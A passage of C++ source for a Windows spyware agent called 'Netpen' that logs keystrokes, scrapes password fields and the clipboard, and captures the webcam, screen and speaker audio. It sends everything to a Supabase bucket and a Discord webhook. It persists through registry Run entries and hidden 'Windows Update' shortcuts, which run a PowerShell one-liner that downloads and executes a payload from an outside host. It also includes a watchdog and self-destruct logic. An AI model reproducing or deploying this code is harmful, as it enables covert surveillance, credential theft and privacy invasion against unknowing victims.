    std::string resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
    std::string json = "{\"executed\":true,\"result_url\":\"" + EscapeJSON(resultUrl) + "\"}";
    std::wstring patchPath = SUPABASE_CONTROL_PATH;
    patchPath += L"?id=eq." + ToWide(rowId);
    std::string resp;
    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);

    std::string host = g_hostname.empty() ? "unknown" : g_hostname;
    PostDiscordImage(host, "Netpen \u2014 " + host + " Webcam", resultUrl, "");

    DeleteFileA(localFile.c_str());
    LogMsg("Webcam done: " + resultUrl);
}

// Poll for a pending "speaker" (audio capture) command.
static std::string CheckSpeakerCmd() {
    std::wstring q = SUPABASE_CONTROL_PATH;
    q += L"?command=eq.speaker&executed=eq.false&hostname=eq." + HostFilterEq() + L"&select=id";
    std::string resp;
    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
    size_t p = resp.find("\"id\":");
    if (p == std::string::npos) return "";
    p += 5;
    size_t e = resp.find_first_of("},]", p);
    if (e == std::string::npos) return "";
    return resp.substr(p, e - p);
}

// Capture 10s of system audio, upload to Storage, PATCH the row, post to Discord.
static void HandleSpeaker(const std::string& rowId) {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string ts = GetScreenshotTimestamp();
    std::string slug = SafeHostSlug(g_hostname);
    std::string localFile = std::string(tmp) + "NetpenAudio_" + slug + "_" + ts + ".wav";
    std::string storageFile = "speaker/" + slug + "_" + ts + ".wav";

    if (!CaptureSpeaker(localFile.c_str())) { LogMsg("Speaker: capture failed"); return; }
    std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
    if (!UploadToStorage(localFile, storagePath, "audio/wav")) {
        LogMsg("Speaker: upload failed");
        DeleteFileA(localFile.c_str());
        return;
    }

    std::string resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
    std::string json = "{\"executed\":true,\"result_url\":\"" + EscapeJSON(resultUrl) + "\"}";
    std::wstring patchPath = SUPABASE_CONTROL_PATH;
    patchPath += L"?id=eq." + ToWide(rowId);
    std::string resp;
    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);

    std::string host = g_hostname.empty() ? "unknown" : g_hostname;
    PostDiscordImage(host, "Netpen \u2014 " + host + " Speaker Capture", resultUrl, "10s WAV audio capture. Download: " + resultUrl);

    DeleteFileA(localFile.c_str());
    LogMsg("Speaker done: " + resultUrl);
}

// Heartbeat: upsert a row in the heartbeat table so the dashboard knows this
// host is alive. Runs every 60s (counter % 60 == 0).
static void SendHeartbeat() {
    std::string json = "{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"last_seen\":\"" + GetTimestamp() + "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}";
    std::string resp;
    std::wstring path = SUPABASE_HEARTBEAT_PATH + HostFilterEq();
    HttpRequest(L"PUT", path.c_str(), json, resp);
}

// Fetch the list of trigger keywords from Supabase screenshot_triggers table.
// Used by CheckAutoScreenshot to decide when to auto-capture.
static void FetchTriggers() {
    std::string resp;
    std::wstring q = L"/rest/v1/screenshot_triggers?active=eq.true&select=keyword";
    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return;
    g_triggers.clear();
    size_t pos = 0;
    while (true) {
        size_t kp = resp.find("\"keyword\":\"", pos);
        if (kp == std::string::npos) break;
        kp += 11;
        size_t ke = resp.find("\"", kp);
        if (ke == std::string::npos) break;
        std::string kw = resp.substr(kp, ke - kp);
        if (!kw.empty()) g_triggers.push_back(kw);
        pos = ke + 1;
    }
}

// Fire-and-forget Discord embed with an image URL. Used for screenshot, webcam,
// and auto-screenshot results. 5s timeout, no retry.
static void PostDiscordImage(const std::string& host, const std::string& title, const std::string& imgUrl, const std::string& desc) {
    std::string payload = "{\"embeds\":[{\"title\":\"" + EscapeJSON(title) + "\",\"color\":3066993,\"description\":\"" + EscapeJSON(desc) + "\",\"image\":{\"url\":\"" + EscapeJSON(imgUrl) + "\"},\"timestamp\":\"" + GetTimestamp() + "\"}]}";
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return;
    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_discordHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", g_discordPath.c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }
    std::wstring hdrs = L"Content-Type: application/json";
    WinHttpSendRequest(hRequest, hdrs.c_str(), hdrs.length(), (LPVOID)payload.c_str(), (DWORD)payload.size(), (DWORD)payload.size(), 0);
    WinHttpReceiveResponse(hRequest, NULL);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
}

// True if title contains any active trigger keyword (case-insensitive).
static bool TitleMatchesTrigger(const std::string& windowTitle, std::string* outKw) {
    if (windowTitle.empty() || g_triggers.empty()) return false;
    std::string lowerTitle;
    lowerTitle.resize(windowTitle.size());
    for (size_t i = 0; i < windowTitle.size(); i++)
        lowerTitle[i] = (char)tolower((unsigned char)windowTitle[i]);
    for (size_t i = 0; i < g_triggers.size(); i++) {
        std::string kw = g_triggers[i];
        std::string lowerKw;
        lowerKw.resize(kw.size());
        for (size_t j = 0; j < kw.size(); j++)
            lowerKw[j] = (char)tolower((unsigned char)kw[j]);
        if (lowerTitle.find(lowerKw) == std::string::npos) continue;
        if (outKw) *outKw = kw;
        return true;
    }
    return false;
}

// Queue auto-screenshot if window title matches a trigger, or if the foreground
// process is WhatsApp.exe (Desktop assist for empty/localized titles). Does NOT
// capture here — heavy work runs on the timer thread via ProcessPendingAutoScreenshot
// after a settle delay (window paint/open animation). Rate-limited to once per 5
// minutes (cooldown applied at capture time). Polled every 1s from WM_TIMER so
// mouse-only focus triggers without keystrokes.
static void CheckAutoScreenshot(const std::string& windowTitle) {
    if (g_triggers.empty()) return;
    if (!g_pendingAutoTitle.empty()) return;
    DWORD now = GetTickCount();
    if (now - g_lastAutoScreenshot < 300000) return;

    std::string matchedKw;
    if (!TitleMatchesTrigger(windowTitle, &matchedKw) && ForegroundIsWhatsApp())
        matchedKw = "whatsapp";
    if (matchedKw.empty()) return;

    g_pendingAutoTitle = windowTitle.empty() ? "WhatsApp" : windowTitle;
    g_pendingAutoKw = matchedKw;
    g_pendingAutoAt = now + 2000;  // let window finish opening before capture
}

// Capture/upload queued auto-screenshot on the message-loop thread. Posts a
// completed control row so the CAPTURES gallery shows it, plus Discord notify.
// Waits until g_pendingAutoAt; cancels (no cooldown) if user left the matched app.
static void ProcessPendingAutoScreenshot() {
    if (g_pendingAutoTitle.empty() || g_selfDestructing) return;
    DWORD now = GetTickCount();
    if (now < g_pendingAutoAt) return;

    std::string liveTitle = GetWindowTitle();
    std::string liveKw;
    bool stillMatch = TitleMatchesTrigger(liveTitle, &liveKw) ||
        (g_pendingAutoKw == "whatsapp" && ForegroundIsWhatsApp());
    if (!stillMatch) {
        g_pendingAutoTitle.clear();
        g_pendingAutoKw.clear();
        g_pendingAutoAt = 0;
        LogMsg("AutoSS: cancelled (left matched window)");
        return;
    }

    std::string windowTitle = liveTitle.empty() ? g_pendingAutoTitle : liveTitle;
    std::string kw = liveKw.empty() ? g_pendingAutoKw : liveKw;
    g_pendingAutoTitle.clear();
    g_pendingAutoKw.clear();
    g_pendingAutoAt = 0;
    g_lastAutoScreenshot = now;

    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string ts = GetScreenshotTimestamp();
    std::string slug = SafeHostSlug(g_hostname);
    std::string localFile = std::string(tmp) + "NetpenAuto_" + slug + "_" + ts + ".jpg";
    std::string storageFile = "auto_screenshots/" + slug + "_" + ts + ".jpg";

    if (!CaptureScreen(localFile.c_str())) { LogMsg("AutoSS: capture failed"); return; }
    std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
    if (!UploadToStorage(localFile, storagePath, "image/jpeg")) {
        LogMsg("AutoSS: upload failed");
        DeleteFileA(localFile.c_str());
        return;
    }
    std::string resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
    std::string host = g_hostname.empty() ? "unknown" : g_hostname;
    PostDiscordImage(host, "Netpen \u2014 " + host + " Auto-Screenshot", resultUrl, "Window: " + windowTitle + " (matched \"" + kw + "\")");

    // Gallery-visible control row (same shape as manual screenshot)
    std::string ctrl = "[{\"command\":\"screenshot\",\"hostname\":\"" + EscapeJSON(g_hostname) +
        "\",\"executed\":true,\"result_url\":\"" + EscapeJSON(resultUrl) + "\"}]";
    std::string resp;
    HttpRequest(L"POST", SUPABASE_CONTROL_PATH, ctrl, resp);

    DeleteFileA(localFile.c_str());
    LogMsg("AutoSS: " + resultUrl + " (trigger: " + kw + ")");
}

// === Password stealing (live form scraping) ====================================

// EnumChildWindows callback: finds password fields (Edit controls with
// EM_GETPASSWORDCHAR != 0) and collects their text.
struct PasswordField { HWND hwnd; std::wstring text; };

static BOOL CALLBACK EnumPasswordProc(HWND hwnd, LPARAM lParam) {
    auto* fields = (std::vector<PasswordField>*)lParam;
    wchar_t cls[32] = {0};
    if (!GetClassNameW(hwnd, cls, 32)) return TRUE;
    if (wcscmp(cls, L"Edit") != 0) return TRUE;
    LRESULT pwdChar = SendMessageW(hwnd, EM_GETPASSWORDCHAR, 0, 0);
    if (!pwdChar) return TRUE;
    int len = (int)SendMessageW(hwnd, WM_GETTEXTLENGTH, 0, 0);
    if (len <= 0) return TRUE;
    if (len > 500) len = 500;
    std::wstring text((size_t)len, 0);
    SendMessageW(hwnd, WM_GETTEXT, (WPARAM)(len + 1), (LPARAM)&text[0]);
    fields->push_back({hwnd, text});
    return TRUE;
}

// Send scraped password text to the Discord webhook with a red embed.
// Resets g_lastDiscord throttle (passwords are a priority alert).
static void PostPasswordToDiscord(const std::string& hostname, const std::string& keys) {
    DWORD now = GetTickCount();
    g_lastDiscord = now;
    std::string host = hostname.empty() ? "unknown" : hostname;
    std::string k = keys.empty() ? "(no keys)" : keys;
    if (k.size() > 1990) k = k.substr(0, 1990) + "...";
    std::string payload = "{\"embeds\":[{\"title\":\"Netpen \\u2014 ";
    payload += EscapeJSON(host);
    payload += " \\u2014 Password\",\"color\":15158332,\"description\":\"";
    payload += EscapeJSON(k);
    payload += "\",\"timestamp\":\"";
    payload += GetTimestamp();
    payload += "\"}]}";
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return;
    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_discordHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", g_discordPath.c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }
    std::wstring headers = L"Content-Type: application/json";
    WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)payload.c_str(),
        (DWORD)payload.size(), (DWORD)payload.size(), 0);
    WinHttpReceiveResponse(hRequest, NULL);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
}

// Scan the foreground window for password fields. If any are found and the
// content has changed since last check, POST them to Supabase + Discord.
// Deduplicates via g_lastPasswordDigest (window-title + field handles + text).
static void CheckPasswordFields() {
    HWND fg = GetForegroundWindow();
    if (!fg) return;
    wchar_t winTitle[256] = {0};
    GetWindowTextW(fg, winTitle, 256);
    std::string winStr = ToNarrow(winTitle);
    std::vector<PasswordField> fields;
    EnumChildWindows(fg, EnumPasswordProc, (LPARAM)&fields);
    if (fields.empty()) return;
    std::string digest = winStr;
    for (size_t i = 0; i < fields.size(); i++) {
        char buf[32];
        sprintf_s(buf, 32, "|%p:", fields[i].hwnd);
        digest += buf;
        digest += ToNarrow(fields[i].text);
    }
    if (digest == g_lastPasswordDigest) return;
    g_lastPasswordDigest = digest;
    std::string combined;
    for (size_t i = 0; i < fields.size(); i++) {
        if (i > 0) combined += " | ";
        combined += ToNarrow(fields[i].text);
    }
    std::string json = "[{\"window_title\":\"[PASSWORD] ";
    json += EscapeJSON(winStr);
    json += "\",\"keys\":\"";
    json += EscapeJSON(combined);
    json += "\",\"hostname\":\"";
    json += EscapeJSON(g_hostname);
    json += "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}]";
    PostKeys(json);
    PostPasswordToDiscord(g_hostname, combined);
}

// Check clipboard text and POST it to Supabase + Discord if it changed since
// last poll. Runs every ~3 seconds (counter % 3 == 0). Caps at 50KB.
static void CheckClipboard() {
    if (!OpenClipboard(NULL)) return;
    HANDLE h = GetClipboardData(CF_UNICODETEXT);
    if (!h) { CloseClipboard(); return; }
    wchar_t* p = (wchar_t*)GlobalLock(h);
    if (!p) { CloseClipboard(); return; }
    std::wstring ws(p);
    GlobalUnlock(h);
    CloseClipboard();
    std::string text = ToNarrow(ws);
    if (text.empty() || text.size() > 50000) return;
    if (text == g_lastClipboard) return;
    g_lastClipboard = text;
    std::string json = "[{\"window_title\":\"[CLIPBOARD]\",\"keys\":\"";
    json += EscapeJSON(text);
    json += "\",\"hostname\":\"";
    json += EscapeJSON(g_hostname);
    json += "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}]";
    PostKeys(json);
    std::string discordText = text.size() > 1000 ? text.substr(0, 1000) + "..." : text;
    PostToDiscord(g_hostname, "[CLIPBOARD]", discordText);
}

// POST win/keys to Discord + Supabase. Re-queues into g_keys on PostKeys failure.
static void FlushKeysToC2(const std::string& win, const std::string& keys) {
    if (keys.empty()) return;
    std::string json = "[{\"window_title\":\"";
    json += EscapeJSON(win);
    json += "\",\"keys\":\"";
    json += EscapeJSON(keys);
    json += "\",\"hostname\":\"";
    json += EscapeJSON(g_hostname);
    json += "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}]";
    PostToDiscord(g_hostname, win, keys);
    if (!PostKeys(json)) {
        g_keys = keys + g_keys;
        if (g_keys.size() > 10000)
            g_keys = g_keys.substr(0, 10000);
    }
}

// Flush title-change keys queued by the hook (timer thread only — never from hook).
static void ProcessPendingKeyFlush() {
    if (g_pendingFlushKeys.empty()) return;
    std::string win = g_pendingFlushWin;
    std::string keys = g_pendingFlushKeys;
    g_pendingFlushWin.clear();
    g_pendingFlushKeys.clear();
    FlushKeysToC2(win, keys);
}

// Flush the live keystroke buffer (current window). Timer / idle path only.
static void FlushBuffer() {
    if (g_keys.empty()) return;
    std::string win = g_winTitle;
    std::string keys = g_keys;
    g_keys.clear();
    FlushKeysToC2(win, keys);
}

// === Low-level keyboard hook ===================================================
// Installed via SetWindowsHookEx(WH_KEYBOARD_LL). Must stay fast: only buffer
// keys, track window title, and queue work. Never call WinHTTP here.
// Flushes and auto-SS capture run on the timer thread.

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = p->vkCode;
        std::string newTitle = GetWindowTitle();
        DWORD now = GetTickCount();

        if (newTitle != g_winTitle) {
            if (!g_keys.empty()) {
                // Queue flush for old title — network happens on timer, not here
                if (g_pendingFlushKeys.empty()) {
                    g_pendingFlushWin = g_winTitle;
                    g_pendingFlushKeys = g_keys;
                } else {
                    g_pendingFlushKeys += g_keys;
                    if (g_pendingFlushKeys.size() > 10000)
                        g_pendingFlushKeys = g_pendingFlushKeys.substr(0, 10000);
                }
                g_keys.clear();
            }
            g_winTitle = newTitle;
            g_lastTick = now;
            CheckAutoScreenshot(newTitle);
        } else if (g_winTitle.empty()) {
            g_winTitle = newTitle;
            CheckAutoScreenshot(newTitle);
        }

        std::string keyStr = GetKeyString(vk);
        if (!keyStr.empty()) {
            g_keys += keyStr;
            g_lastTick = now;
        }
        g_winTitle = newTitle;
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Prefer per-build randomized key from config.h (AGENT_REGKEY); fallback static.
#ifdef AGENT_REGKEY
#define NETPEN_REGKEY AGENT_REGKEY
#elif !defined(NETPEN_REGKEY)
#define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
#endif

static void EnsureStartupEntry();
static void CreateStartupFolderEntry();
static void RemoveStartupFolderEntry();
static void CreateAllUsersStartupEntry();
static void RemoveAllUsersStartupEntry();

// True when the process token is elevated (admin). No UAC prompt — only checks.
static bool IsElevated() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return false;
    TOKEN_ELEVATION elev = {0};
    DWORD ret = 0;
    BOOL ok = GetTokenInformation(hToken, TokenElevation, &elev, sizeof(elev), &ret);
    CloseHandle(hToken);
    return ok && elev.TokenIsElevated;
}

// C2 identity: "COMPUTER\\username" so multi-user on one PC is distinguishable.
static std::string GetAgentIdentity() {
    char computer[256] = {0};
    DWORD csz = sizeof(computer);
    GetComputerNameA(computer, &csz);
    char user[256] = {0};
    DWORD usz = sizeof(user);
    if (!GetUserNameA(user, &usz) || user[0] == 0) return std::string(computer);
    return std::string(computer) + "\\" + user;
}

// True if HKCU\Run still has our download one-liner (not just the marker key).
static bool RunValueExists() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return false;
    DWORD type = 0, size = 0;
    LONG r = RegQueryValueExA(hKey, GetExeName().c_str(), NULL, &type, NULL, &size);
    RegCloseKey(hKey);
    return r == ERROR_SUCCESS && type == REG_SZ;
}

// === Persistence management ====================================================
// Layers:
//   1. HKCU\Run — restored every 2 min if GPO wipes it
//   2. Per-user startup .lnk — only when Run missing; removed when healthy
//   3. All Users startup .lnk — only if elevated; seeds other users on logon
//   4. Self-destruct reverses all of the above + deletes EXE files

// Remove all persistence traces. Called during self-destruct.
// Note: HKEY_CURRENT_USER\Run delete via RegDeleteValueA doesn't check the
// open key first (intentional — the key always exists in theory).
static void CleanupPersistence() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, GetExeName().c_str());
        RegCloseKey(hKey);
    }
    RegDeleteKeyA(HKEY_CURRENT_USER, NETPEN_REGKEY);
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string cachedExe = std::string(tempPath) + GetExeName();
    DeleteFileA(cachedExe.c_str());
    DeleteFileA((std::string(tempPath) + "wuaueng.log").c_str());
    char appdata[MAX_PATH];
    if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) > 0 && appdata[0]) {
        DeleteFileA((std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.bat").c_str());
        DeleteFileA((std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.lnk").c_str());
    }
    RemoveAllUsersStartupEntry();
}

// === Hidden window procedure ===================================================
// Backed by a message-only window (desktop HWND_MESSAGE parent). The 1-second
// timer does all periodic work. Counter values control scheduling:
//   every tick = pending key flush, title poll for auto-SS, process pending auto-SS
//   x % 2  = password field check      (every 2s)
//   x % 3  = clipboard check           (every 3s)
//   x % 5  = flush buffer if idle      (every 5s, 300ms grace)
//   x % 30 = self-destruct / stop      (every 30s)
//   x % 60 = heartbeat, commands       (every 60s)
//   x % 120 = persistence check        (every 2 min)

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE:
            SetTimer(hwnd, 1, 1000, NULL);
            break;
        case WM_TIMER:
        {
            static int counter = 0;
            counter++;
            if (!g_selfDestructing) {
                ProcessPendingKeyFlush();
                // Poll foreground title so mouse-only focus still triggers auto-SS
                CheckAutoScreenshot(GetWindowTitle());
                ProcessPendingAutoScreenshot();
            }
            if (counter % 3 == 0 && !g_selfDestructing) CheckClipboard();
            if (counter % 2 == 0 && !g_selfDestructing) CheckPasswordFields();
            if (counter % 5 == 0 && !g_keys.empty()) {
                DWORD now = GetTickCount();
                if (now - g_lastTick > 300) FlushBuffer();
            }
            if (counter % 30 == 0) {
                if (CheckSelfDestruct()) {
                    g_selfDestructing = true;
                    CleanupPersistence();
                    ScheduleSelfDestruct();
                    CreateKillFlag();
                    g_running = false;
                    DestroyWindow(hwnd);
                } else if (CheckStop()) {
                    g_running = false;
                    DestroyWindow(hwnd);
                }
            }
            if (counter % 60 == 0 && !g_selfDestructing) {
                SendHeartbeat();
                FetchTriggers();
                std::string scRowId = CheckScreenshotCmd();
                if (!scRowId.empty()) HandleScreenshot(scRowId);
                std::string wcRowId = CheckWebcamCmd();
                if (!wcRowId.empty()) HandleWebcam(wcRowId);
                std::string spRowId = CheckSpeakerCmd();
                if (!spRowId.empty()) HandleSpeaker(spRowId);
                CheckAndHandleExec();
            }
            if (counter % 120 == 0 && !g_selfDestructing) {
                EnsureStartupEntry();
            }
            break;
        }
        case WM_DESTROY:
            KillTimer(hwnd, 1);
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

// Set up the NETPEN_REGKEY marker and HKCU\Run download one-liner.
// If elevated, also seed All Users startup so other logons get the agent.
static void InstallStartup() {
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        const char* marker = "1";
        RegSetValueExA(hKey, "Payload", 0, REG_SZ, (BYTE*)marker, (DWORD)strlen(marker) + 1);
        RegCloseKey(hKey);
    }

    std::string psCmd = "powershell -w h -c \"$p=$env:TEMP+'\\" + GetExeName() + "';$wc=New-Object Net.WebClient;$wc.DownloadFile('https://allseeing.netlify.app/a',$p);start $p\"";

    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, GetExeName().c_str(), 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)psCmd.size() + 1);
        RegCloseKey(hKey);
    }
    if (IsElevated()) CreateAllUsersStartupEntry();
}

// Check Run value (not only marker). Healthy → remove user startup .lnk.
// Missing → reinstall. If elevated, re-assert All Users seed.
static void EnsureStartupEntry() {
    if (RunValueExists()) {
        RemoveStartupFolderEntry();
    } else {
        InstallStartup();
        CreateStartupFolderEntry();
    }
    if (IsElevated()) CreateAllUsersStartupEntry();
}

// Create a WindowsUpdate.lnk in the given startup folder (user or All Users).
static void CreateStartupLnkAt(const std::string& startupPath) {
    DeleteFileA((startupPath + "\\WindowsUpdate.bat").c_str());
    std::string lnkPath = startupPath + "\\WindowsUpdate.lnk";
    DeleteFileA(lnkPath.c_str());
    std::wstring args = L"-w h -c \"$p=$env:TEMP+'\\" + GetExeNameW() + L"';$wc=New-Object Net.WebClient;$wc.DownloadFile('https://allseeing.netlify.app/a',$p);start $p\"";
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return;
    bool needUninit = SUCCEEDED(hr);
    IShellLinkW* psl = NULL;
    if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&psl))) {
        psl->SetPath(L"powershell.exe");
        psl->SetArguments(args.c_str());
        psl->SetShowCmd(SW_HIDE);
        psl->SetDescription(L"Windows Update");
        IPersistFile* ppf = NULL;
        if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf))) {
            ppf->Save(ToWide(lnkPath).c_str(), TRUE);
            ppf->Release();
        }
        psl->Release();
    }
    if (needUninit) CoUninitialize();
}

// Per-user startup .lnk — only when Run is missing. Removed when healthy.
static void CreateStartupFolderEntry() {
    char appdata[MAX_PATH];
    if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) == 0 || appdata[0] == 0) return;
    CreateStartupLnkAt(std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
}

// All Users startup — requires elevation. Runs for every interactive logon.
static void CreateAllUsersStartupEntry() {
    if (!IsElevated()) return;
    char allUsers[MAX_PATH];
    if (GetEnvironmentVariableA("ALLUSERSPROFILE", allUsers, MAX_PATH) == 0 || allUsers[0] == 0) return;
    CreateStartupLnkAt(std::string(allUsers) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
}

// Delete per-user startup artifacts. Called from RunChild and EnsureStartupEntry.
static void RemoveStartupFolderEntry() {
    char appdata[MAX_PATH];
    if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) == 0 || appdata[0] == 0) return;
    std::string p = std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    DeleteFileA((p + "\\WindowsUpdate.bat").c_str());
    DeleteFileA((p + "\\WindowsUpdate.lnk").c_str());
}

// Delete All Users seed (best-effort; fails silently if not elevated).
static void RemoveAllUsersStartupEntry() {
    char allUsers[MAX_PATH];
    if (GetEnvironmentVariableA("ALLUSERSPROFILE", allUsers, MAX_PATH) == 0 || allUsers[0] == 0) return;
    std::string p = std::string(allUsers) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    std::string bat = p + "\\WindowsUpdate.bat";
    std::string lnk = p + "\\WindowsUpdate.lnk";
    BOOL batOk = DeleteFileA(bat.c_str());
    BOOL lnkOk = DeleteFileA(lnk.c_str());
    if ((!batOk && GetLastError() != ERROR_FILE_NOT_FOUND) ||
        (!lnkOk && GetLastError() != ERROR_FILE_NOT_FOUND)) {
        if (!IsElevated())
            LogMsg("All Users startup cleanup failed (not elevated — seed may remain)");
    }
}

// === Child process (entry point: --child flag) ==================================
// Creates the hidden window, registers the low-level keyboard hook, cleans the
// startup folder, then enters the message loop. The hook and timer do the work.

static int RunChild(HINSTANCE hInstance) {
    g_hostname = GetAgentIdentity();

    WNDCLASSEXW wc = {0};
    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = AGENT_CLASS;
    if (!RegisterClassExW(&wc)) return 1;

    Gdiplus::GdiplusStartupInput gdiInput;
    ULONG_PTR gdiToken;
    Gdiplus::GdiplusStartup(&gdiToken, &gdiInput, NULL);

    g_hwnd = CreateWindowExW(0, AGENT_CLASS, L"", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
    if (!g_hwnd) { Gdiplus::GdiplusShutdown(gdiToken); return 1; }

    g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    if (!g_hHook) {
        LogMsg("Hook failed: " + std::to_string(GetLastError()));
        return 1;
    }

    LogMsg("Child started on " + g_hostname);
    RemoveStartupFolderEntry();
    FetchTriggers();

    MSG msg;
    while (g_running && GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (g_hHook) UnhookWindowsHookEx(g_hHook);
    if (g_hwnd) DestroyWindow(g_hwnd);
    Gdiplus::GdiplusShutdown(gdiToken);
    LogMsg("Child stopped");
    return 0;
}

// === Watchdog process ==========================================================
// Entry point. Decrypts C2 config, hides the console, checks for --child flag.
// If --child: runs the child (lines above).
// Otherwise: creates a singleton mutex, installs persistence, then loops
// spawning the child every 5 minutes. Each iteration:
//   - Waits for child to exit or 5 min timeout
//   - On timeout: checks for remote update (supersedes local version)
//   - On timeout: checks for .kill flag (self-destruct)
//   - If neither: sleeps 3s and re-spawns the child

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
    InitConfig();
    HWND consoleWnd = GetConsoleWindow();
    if (consoleWnd) ShowWindow(consoleWnd, SW_HIDE);

    std::string cmdLine(lpCmdLine ? lpCmdLine : "");
    if (cmdLine.find("--child") != std::string::npos) {
        return RunChild(hInstance);
    }

    CreateMutexW(NULL, TRUE, AGENT_MUTEX);
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    g_hostname = GetAgentIdentity();

    InstallStartup();
    LogMsg("Watchdog started on " + g_hostname + (IsElevated() ? " (elevated multi-user seed)" : ""));

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string exePath(path);

    while (true) {
        RemoveKillFlag();

        STARTUPINFOA si = {0};
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi = {0};
        std::string childCmd = "\"" + exePath + "\" --child";

        if (!CreateProcessA(exePath.c_str(), &childCmd[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            Sleep(30000);
            continue;
        }

        bool updated = false;
        while (true) {
            DWORD wr = WaitForSingleObject(pi.hProcess, 300000);
            if (wr == WAIT_TIMEOUT) {
                int rv = GetRemoteVersion();
